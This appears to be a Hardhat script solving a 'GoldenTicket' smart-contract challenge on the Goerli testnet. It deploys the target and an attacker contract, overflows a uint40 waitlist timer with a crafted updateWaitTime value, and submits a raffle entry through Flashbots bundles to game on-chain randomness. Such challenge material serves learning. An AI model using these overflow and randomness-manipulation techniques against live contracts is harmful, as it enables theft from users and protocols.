import { ethers } from "hardhat";
import {
  FlashbotsBundleProvider,
  FlashbotsBundleResolution,
} from "@flashbots/ethers-provider-bundle";

async function main() {
  const MAX_UINT_40 = 1099511627775;
  const [signer] = await ethers.getSigners();

  if (!process.env.PRIVATE_KEY) {
    console.log("Check .env.example");
    process.exit(1);
  }

  if (!process.env.GOERLI_RPC_URL) {
    console.log("Check .env.example");
    process.exit(1);
  }

  const GoldenTicket = await ethers.getContractFactory("GoldenTicket");

  console.log("Deploying contract");
  const goldenTicket = await GoldenTicket.deploy();
  console.log(`Contract deployed: ${goldenTicket.address}`);

  const GoldenTicketAttacker = await ethers.getContractFactory(
    "GoldenTicketAttacker"
  );
  console.log("Deploying attacker");
  const goldenTicketAttacker = await GoldenTicketAttacker.deploy();
  console.log(`Attacker deployed: ${goldenTicketAttacker.address}`);

  const provider = new ethers.providers.JsonRpcProvider(
    process.env.GOERLI_RPC_URL,
    "goerli"
  );

  const authSigner = new ethers.Wallet(
    "0x2000000000000000000000000000000000000000000000000000000000000000",
    provider
  );

  const flashbotsProvider = await FlashbotsBundleProvider.create(
    provider,
    authSigner,
    "https://relay-goerli.flashbots.net",
    "goerli"
  );

  await goldenTicket.joinWaitlist();
  await goldenTicket.updateWaitTime(
    MAX_UINT_40 - (await goldenTicket.waitlist(signer.address)) + 1
  );

  const gasPrice = await provider.getGasPrice();
  const signedTransactions = await flashbotsProvider.signBundle([
    {
      signer,
      transaction: {
        ...(await goldenTicket.populateTransaction.joinRaffle(
          await goldenTicketAttacker.getRaffleInput()
        )),
        chainId: 5,
        gasPrice,
      },
    },
  ]);

  const blockNumber = await provider.getBlockNumber();

  const simulation = await flashbotsProvider.simulate(
    signedTransactions,
    blockNumber + 1
  );

  // Using TypeScript discrimination
  if ("error" in simulation) {
    console.log(`Simulation Error: ${simulation.error.message}`);
  } else {
    console.log("Simulation succeded let's send bundles :)");

    provider.on("block", async (blockNumber) => {
      console.log(`Submitting bundle for block ${blockNumber + 1}`);

      const bundleSubmission = await flashbotsProvider.sendRawBundle(
        signedTransactions,
        blockNumber + 1
      );

      if ("error" in bundleSubmission) {
        console.log(
          `Something went wrong sending the bundle: ${bundleSubmission.error.message}`
        );
      } else {
        const bundleResolution = await bundleSubmission.wait();
        if (bundleResolution === FlashbotsBundleResolution.BundleIncluded) {
          console.log(`${blockNumber + 1}: Bundle included let's goooo`);
          process.exit(0);
        } else if (
          bundleResolution ===
          FlashbotsBundleResolution.BlockPassedWithoutInclusion
        ) {
          console.log(
            `${blockNumber + 1}: Block wasn't included. Let's keep going...`
          );
        } else if (
          bundleResolution === FlashbotsBundleResolution.AccountNonceTooHigh
        ) {
          console.log(`${blockNumber + 1}: Account nonce too high :(`);
          process.exit(1);
        }
      }
    });
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
